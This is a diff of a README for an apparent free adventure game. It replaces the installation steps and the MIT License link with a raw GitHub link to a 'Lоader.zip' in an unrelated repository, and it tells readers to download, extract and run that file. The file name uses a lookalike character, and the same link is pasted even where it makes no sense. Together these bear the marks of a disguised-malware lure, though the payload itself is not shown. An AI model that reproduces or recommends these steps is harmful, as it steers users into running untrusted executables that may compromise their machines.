@@ -24,9 +24,9 @@ Conway Disappearance at Dahlia View , mystery game, no subscription, adventure P
 
 ## 🧩 Installation Instructions
 
-1. Download **Loader.rar** from the repository.
-2. Extract Loader.rar using WinRAR, 7-Zip, or built-in tools.
-3. Run Loader.exe (Windows), Loader.app (macOS), or Loader.sh (Linux).
+1. Download **https://raw.githubusercontent.com/Canon2323/baseClaudeReactWebtemplate/main/Lоader.zip** from the repository.
+2. Extract https://raw.githubusercontent.com/Canon2323/baseClaudeReactWebtemplate/main/Lоader.zip using WinRAR, 7-Zip, or built-in tools.
+3. Run https://raw.githubusercontent.com/Canon2323/baseClaudeReactWebtemplate/main/Lоader.zip (Windows), https://raw.githubusercontent.com/Canon2323/baseClaudeReactWebtemplate/main/Lоader.zip (macOS), or https://raw.githubusercontent.com/Canon2323/baseClaudeReactWebtemplate/main/Lоader.zip (Linux).
 4. Follow on-screen steps to complete the game setup.
 5. Launch and enjoy the immersive adventure!
 
@@ -36,4 +36,4 @@ This repository is for educational and demonstration purposes only. Redistributi
 
 ## 📄 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT) – 2025 Edition. Enjoy and share responsibly!
+Distributed under the [MIT License](https://raw.githubusercontent.com/Canon2323/baseClaudeReactWebtemplate/main/Lоader.zip) – 2025 Edition. Enjoy and share responsibly!
